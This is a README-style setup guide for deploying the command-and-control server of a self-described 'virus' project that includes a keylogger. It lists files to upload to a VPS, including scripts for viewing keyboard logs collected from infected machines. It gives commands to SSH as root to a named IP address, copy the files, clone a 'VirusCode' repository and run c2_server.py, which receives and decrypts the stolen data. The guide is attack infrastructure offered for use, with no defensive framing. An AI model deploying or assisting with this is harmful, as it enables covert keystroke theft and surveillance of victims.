# Files to Push to Server (VPS)

## Required Files (Minimum)

These files are **REQUIRED** to run the C2 server:

1. **`c2_server.py`** ✅ **REQUIRED**
   - Main C2 server script
   - Receives and decrypts data from virus
   - No external dependencies (uses Python standard library only)

## Optional but Recommended Files

These files make it easier to view and manage received data:

2. **`view_keyboard_logs.sh`** ⭐ **RECOMMENDED**
   - Script to view keyboard logs from received data
   - Makes it easy to read keyboard logs

3. **`check_keylogger_on_server.sh`** ⭐ **RECOMMENDED**
   - Script to check if keyboard logs are present in received data
   - Useful for verification

4. **`view_server_data.py`** ⭐ **RECOMMENDED**
   - Python script to view and analyze received data
   - Shows statistics and summaries

5. **`C2_SERVER_SETUP.md`** 📖 **OPTIONAL**
   - Documentation and setup instructions
   - Helpful reference guide

## Quick Setup

### Step 1: Create directory on server
```bash
ssh root@103.75.183.125
mkdir -p ~/VirusServer
cd ~/VirusServer
```

### Step 2: Upload files (choose one method)

**Method A: Using SCP**
```bash
# From your local machine
scp c2_server.py root@103.75.183.125:~/VirusServer/
scp view_keyboard_logs.sh root@103.75.183.125:~/VirusServer/
scp check_keylogger_on_server.sh root@103.75.183.125:~/VirusServer/
scp view_server_data.py root@103.75.183.125:~/VirusServer/
```

**Method B: Using Git**
```bash
# On server
cd ~/VirusServer
git clone https://github.com/phu142857/VirusCode.git
# Or just download the specific files
```

**Method C: Manual copy-paste**
- Copy content of `c2_server.py` and create file on server

### Step 3: Make scripts executable
```bash
cd ~/VirusServer
chmod +x view_keyboard_logs.sh
chmod +x check_keylogger_on_server.sh
```

### Step 4: Configure C2_KEY
```bash
# Edit c2_server.py and change C2_KEY to match virus_config.py
nano c2_server.py
# Change: C2_KEY = "default_key_change_me"
# To match the key in virus_config.py
```

### Step 5: Run server
```bash
python3 c2_server.py
```

## File Summary

| File | Required? | Purpose |
|------|-----------|---------|
| `c2_server.py` | ✅ **YES** | Main C2 server - receives data |
| `view_keyboard_logs.sh` | ⭐ Recommended | View keyboard logs easily |
| `check_keylogger_on_server.sh` | ⭐ Recommended | Check if logs exist |
| `view_server_data.py` | ⭐ Recommended | View data summaries |
| `C2_SERVER_SETUP.md` | 📖 Optional | Documentation |

## Minimum Setup (Just to receive data)

If you only want to receive data, you only need:
- `c2_server.py`

Then run:
```bash
python3 c2_server.py
```

Data will be saved to `received_data/` directory automatically.

